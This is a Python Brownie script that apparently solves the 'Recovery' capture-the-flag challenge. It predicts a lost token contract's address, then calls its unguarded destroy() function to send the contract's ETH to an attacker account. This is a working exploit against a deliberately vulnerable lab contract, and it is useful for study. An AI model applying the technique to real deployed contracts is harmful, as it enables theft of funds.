#!/usr/bin/python3
from brownie import Recovery, SimpleToken, web3, convert
from scripts.deploy import deploy, mk_contract_address
from scripts.helpful_scripts import get_account, convert
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    if not contract_address:
        generated_addr, recovery, _ = deploy()
        contract_address = recovery.address
        _, attacker = get_account()
    else:
        recovery = Recovery.at(contract_address)
        # * predict the address of the lost account
        generated_addr = mk_contract_address(contract_address, 1)

    assert generated_addr == "0x8f5b49Cf1b32d9711291D3c2BD63923dc527ac56"

    name = web3.eth.get_storage_at(generated_addr, 0).decode()
    token = SimpleToken.at(generated_addr)

    print(f"{blue}Name: {blue}{name}{reset}")
    print(
        f"{green}Balance of {name}: {red}{web3.fromWei(web3.eth.get_balance(generated_addr), 'ether')} ETH{reset}"
    )
    print(
        f"{green}Balance of attacker: {red}{web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')} ETH{reset}"
    )

    # exit(1)

    token.destroy(attacker, {"from": attacker})
    print(
        f"{green}Balance of {name}: {web3.fromWei(web3.eth.get_balance(generated_addr), 'ether')} ETH{reset}"
    )
    print(
        f"{green}Balance of attacker: {red}{web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')} ETH{reset}"
    )

    assert web3.fromWei(web3.eth.get_balance(generated_addr), "ether") == 0


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
